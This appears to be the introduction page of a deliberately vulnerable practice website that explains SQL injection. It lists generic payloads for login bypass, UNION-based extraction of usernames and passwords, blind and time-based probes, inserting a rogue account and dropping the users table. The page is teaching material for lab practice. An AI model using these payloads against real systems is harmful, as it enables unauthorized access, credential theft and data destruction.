SQL Injections

Welcome to The Vulnerable Site. This site is designed to help you understand common security flaws in web applications. On the next page, you'll encounter a login page with a high-level vulnerability that allows for unauthorized access through SQL Injection.

SQL Injection is a technique where attackers exploit vulnerabilities in an application's input fields by injecting malicious SQL code, which is then executed by the backend database. This allows attackers to manipulate the database in unintended ways, such as bypassing authentication, retrieving sensitive data, modifying or deleting records, and even executing administrative commands. By manipulating SQL queries through user inputs, attackers can gain unauthorized access to the application's data and functions, potentially leading to severe security breaches.

SQL Injection Examples

Login Bypass:

' OR '1'='1';--

This simple injection bypasses the authentication mechanism by making the condition always true.

Retrieve All Usernames:

' UNION SELECT username, password FROM users;--

This query retrieves usernames and passwords from the users table.

Blind SQL Injection:

' AND (SELECT COUNT(*) FROM users) > 0;--

Used to confirm if certain data exists in the database by posing a true/false condition.

Extract Database Version:

' UNION SELECT @@version;--

This command retrieves the database version running on the server.

Retrieve Database Names:

' UNION SELECT schema_name FROM information_schema.schemata;--

Fetches the names of all databases on the server.

Time-Based Blind SQL Injection:

' OR IF(1=1, SLEEP(5), 0);--

Delays the response by 5 seconds if the condition is true, indicating a vulnerability.

Extract User Data:

' UNION SELECT null, username, password FROM users;--

Extracts usernames and passwords from the users table, with a null to match the number of columns.

Check Table Existence:

' AND (SELECT COUNT(*) FROM users) > 0;--

Checks if the users table exists by counting rows.

Extract Column Names:

' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users';--

Retrieves the names of columns in the users table.

Double Query Injection:

'; INSERT INTO users (username, password) VALUES ('hacker', 'password');--

Adds a new user account by injecting an additional SQL query.

Drop Table:

'; DROP TABLE users;--

This dangerous command deletes the users table entirely.
